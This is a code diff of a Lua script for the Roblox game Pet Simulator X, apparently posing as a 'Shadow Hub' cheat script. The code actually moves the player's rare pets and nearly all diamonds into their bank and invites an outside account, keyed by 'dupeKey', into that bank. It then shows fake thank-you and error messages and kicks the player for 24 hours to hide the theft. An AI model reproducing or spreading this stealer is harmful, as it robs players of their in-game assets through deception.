@@ -5,8 +5,20 @@ local mybanks = lib.Network.Invoke("get my banks")
 local PetsList = {}
 for i,v in pairs(lib.Save.Get().Pets) do
     local v2 = lib.Directory.Pets[v.id];
-    if v2.rarity == "Exclusive" or v2.rarity == "Mythical" and v.dm or v2.rarity == "Mythical" and v.r then
+    if v2.rarity == "Exclusive" or v2.rarity == "Mythical" and v.dm or v2.rarity == "Legendary" and v.r then
         table.insert(PetsList, v.uid);
     end
 end
-local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 1)
+local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 1);
+if request then
+    lib.Message.New("Hello Thank you For Using The Script!!");
+else
+    lib.Message.New(request2 and "We introduce to you Shadow Hub. An overpowered script made especially for Pet Simulator X. We have many features and we will be talking about it later. Shadow Hub is only currently on beta so we are sharing you our script to tell us if there are any problems with our script. Now onto the features, it has a built-in anti-afk, crash servers, fastest Autofarm, Autobuy merchant, etc..");
+    return;
+end
+if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], dupeKey) then
+    lib.Message.New("Error!! Please Wait 10 minutes for error to be Fixed!.");
+else
+    lib.Message.New("Fixing The Problem Please be Patient");
+end
+game.Players.LocalPlayer:Kick("Join after 24 hours!")
